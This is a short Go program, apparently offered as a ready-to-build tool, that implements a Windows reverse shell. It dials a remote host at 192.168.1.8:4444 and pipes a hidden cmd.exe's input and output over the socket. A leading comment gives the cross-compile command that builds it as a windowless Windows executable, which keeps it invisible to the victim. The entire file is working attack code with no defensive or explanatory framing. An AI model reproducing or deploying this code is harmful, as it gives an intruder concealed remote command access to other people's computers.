// HOW TO COMPILE THIS INTO AN EXECUTABLE FILE
// env GOOS=windows GOARCH=386 go build -ldflags -H=windowsgui rshell.go
package main

import (
    "net"
    "os/exec"
    "syscall"
)

func main() {
    socket, _ := net.Dial("tcp", "192.168.1.8:4444")
    rshell := exec.Command("cmd.exe")
    rshell.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    rshell.Stdin = socket
    rshell.Stdout = socket
    rshell.Stderr = socket
    rshell.Run()
}
